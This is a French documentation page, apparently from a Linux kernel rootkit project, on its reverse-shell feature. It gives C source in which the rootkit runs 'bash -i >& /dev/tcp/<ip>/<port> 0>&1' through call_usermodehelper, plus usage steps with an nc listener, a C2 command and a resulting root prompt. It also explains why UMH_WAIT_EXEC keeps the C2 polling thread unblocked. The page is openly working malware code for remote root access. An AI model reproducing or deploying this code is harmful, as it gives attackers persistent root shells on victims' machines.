---
title: Reverse Shell
description: Ouvre une session bash interactive depuis la victime vers l'attaquant via une connexion TCP brute.
---

**Bonus**

Ouvre une session bash interactive depuis la victime vers l'attaquant via une connexion TCP brute.

## Fonctionnement

Un reverse shell est un shell qui se connecte *vers l'extérieur* depuis la victime vers l'attaquant, contournant les pare-feux qui bloquent les connexions entrantes. L'attaquant ouvre un écouteur TCP (`nc -lvnp 4444`), puis envoie l'action `shell:<ip>,<port>` au rootkit.

Le rootkit démarre `bash -i >& /dev/tcp/<ip>/<port> 0>&1` via `call_usermodehelper()` avec **`UMH_WAIT_EXEC`** — ce qui signifie que le thread noyau attend seulement que `execve` se termine, puis retourne immédiatement. Le processus bash continue de tourner en arrière-plan, donc le thread de polling C2 n'est jamais bloqué.

## Implémentation

```c
// rootkit/src/exec.c : reverse_shell()

void reverse_shell(char *ip, unsigned int port)
{
    char *cmd = kmalloc(256, GFP_KERNEL);
    // Builtin bash : redirection de stdio sur une socket TCP
    snprintf(cmd, 256,
             "bash -i >& /dev/tcp/%s/%u 0>&1", ip, port);

    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     "TERM=xterm",   // nécessaire pour les programmes interactifs
                     NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, ...);

    // UMH_WAIT_EXEC : retour une fois execve() terminé.
    // bash continue en arrière-plan : le thread de polling n'est PAS bloqué.
    call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
    kfree(cmd);
}
```

:::tip[UMH_WAIT_EXEC vs UMH_WAIT_PROC]
`UMH_WAIT_EXEC` est utilisé ici intentionnellement : le thread noyau retourne dès que bash démarre, pas quand la session se termine. Le polling C2 continue normalement pendant que la session shell tourne en parallèle. `UMH_WAIT_PROC` bloquerait l'intégralité du thread de polling pour la durée de la session — potentiellement des heures.
:::

## Utilisation

```sh
# 1. Sur la machine attaquante — ouvrir un écouteur
nc -lvnp 4444

# 2. Dans le tableau de bord C2 — envoyer l'action
shell:10.0.2.2,4444

# 3. Un shell interactif apparaît dans le terminal nc
root@victim:~#
```

## Ce qu'on a essayé d'abord

La première version utilisait `UMH_WAIT_PROC`, le même flag d'attente que `exec_command()`. Ce flag bloque l'appelant jusqu'à ce que le processus enfant se termine complètement. Pour une commande courte c'est acceptable, mais un reverse shell reste ouvert aussi longtemps que l'attaquant garde la session active.

Le résultat : le thread de polling C2 était complètement bloqué pendant la durée de la session. Aucune nouvelle commande ne pouvait être reçue, aucune autre action dispatchée. Passer à `UMH_WAIT_EXEC` a résolu le problème — le kthread de polling retourne immédiatement et continue de tourner en parallèle de la session shell ouverte.
